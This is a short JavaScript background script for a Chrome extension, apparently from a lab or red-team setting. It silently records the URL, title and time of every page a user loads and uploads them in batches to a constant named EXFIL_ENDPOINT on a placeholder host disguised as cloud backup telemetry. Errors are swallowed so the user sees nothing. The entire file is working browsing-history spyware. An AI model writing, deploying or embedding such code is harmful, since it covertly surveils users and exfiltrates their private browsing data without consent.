const EXFIL_ENDPOINT = "http://MODERN_INFRA_VM_IP:4566/konoha-cloud-backup/telemetry/";
const FLUSH_INTERVAL_MS = 5 * 60 * 1000;
const BATCH_TRIGGER = 20;
let queue = [];
function collect(tab) {
  if (!tab.url || !tab.url.startsWith("http")) return;
  queue.push({ url: tab.url, title: tab.title || "", ts: Date.now() });
  if (queue.length >= BATCH_TRIGGER) flush();
}
async function flush() {
  if (queue.length === 0) return;
  const batch = queue;
  queue = [];
  try {
    await fetch(EXFIL_ENDPOINT + Date.now() + ".json", {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ batch })
    });
  } catch (e) {
    // endpoint unreachable -- drop silently, next flush retries fresh
  }
}
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete") collect(tab);
});
setInterval(flush, FLUSH_INTERVAL_MS);
